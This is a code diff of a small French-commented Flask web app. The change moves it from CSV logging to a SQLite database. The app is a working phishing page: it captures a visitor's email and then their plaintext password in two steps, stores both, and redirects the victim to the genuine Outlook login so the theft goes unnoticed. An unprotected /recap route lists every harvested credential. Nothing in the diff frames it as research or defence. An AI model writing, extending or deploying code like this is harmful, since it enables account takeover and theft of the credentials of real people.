@@ -1,18 +1,25 @@
 from flask import Flask, request, render_template, redirect, session
-import csv
-import os
+import sqlite3
 from datetime import datetime
+import os
 
 app = Flask(__name__)
 app.secret_key = "ceci_est_une_clé_secrète_à_modifier"
+DB_FILE = "data.db"
 
-LOG_FILE = "log.csv"
-
-# Crée le fichier si nécessaire
-if not os.path.exists(LOG_FILE):
-    with open(LOG_FILE, mode="w", newline="", encoding="utf-8") as file:
-        writer = csv.writer(file)
-        writer.writerow(["Horodatage", "Email", "Mot de passe"])
+# Initialisation de la base SQLite
+def init_db():
+    with sqlite3.connect(DB_FILE) as conn:
+        c = conn.cursor()
+        c.execute("""
+            CREATE TABLE IF NOT EXISTS logins (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                timestamp TEXT,
+                email TEXT,
+                password TEXT
+            )
+        """)
+        conn.commit()
 
 @app.route("/", methods=["GET"])
 def home():
@@ -26,9 +33,10 @@ def step1():
     session["email"] = email
     session["timestamp"] = timestamp
 
-    with open(LOG_FILE, mode="a", newline="", encoding="utf-8") as file:
-        writer = csv.writer(file)
-        writer.writerow([timestamp, email, ""])
+    with sqlite3.connect(DB_FILE) as conn:
+        c = conn.cursor()
+        c.execute("INSERT INTO logins (timestamp, email, password) VALUES (?, ?, ?)", (timestamp, email, ""))
+        conn.commit()
 
     return render_template("password.html", email=email)
 
@@ -38,19 +46,10 @@ def step2():
     timestamp = session.get("timestamp")
     password = request.form.get("password")
 
-    rows = []
-    with open(LOG_FILE, mode="r", encoding="utf-8") as file:
-        reader = csv.reader(file)
-        rows = list(reader)
-
-    for i in range(1, len(rows)):
-        if rows[i][0] == timestamp and rows[i][1] == email and rows[i][2] == "":
-            rows[i][2] = password
-            break
-
-    with open(LOG_FILE, mode="w", newline="", encoding="utf-8") as file:
-        writer = csv.writer(file)
-        writer.writerows(rows)
+    with sqlite3.connect(DB_FILE) as conn:
+        c = conn.cursor()
+        c.execute("UPDATE logins SET password = ? WHERE timestamp = ? AND email = ? AND password = ''", (password, timestamp, email))
+        conn.commit()
 
     session.clear()
     return redirect("https://outlook.office.com")
@@ -58,11 +57,10 @@ def step2():
 @app.route("/recap", methods=["GET"])
 def recap():
     rows = []
-    if os.path.exists(LOG_FILE):
-        with open(LOG_FILE, mode="r", encoding="utf-8") as file:
-            reader = csv.reader(file)
-            next(reader)
-            rows = list(reader)
+    with sqlite3.connect(DB_FILE) as conn:
+        c = conn.cursor()
+        c.execute("SELECT timestamp, email, password FROM logins")
+        rows = c.fetchall()
 
     table_html = "<h2>Récapitulatif des tentatives</h2><table border='1'><tr><th>Horodatage</th><th>Email</th><th>Mot de passe</th></tr>"
     for row in rows:
@@ -71,4 +69,5 @@ def recap():
     return table_html
 
 if __name__ == "__main__":
+    init_db()
     app.run(host="0.0.0.0", port=5000)
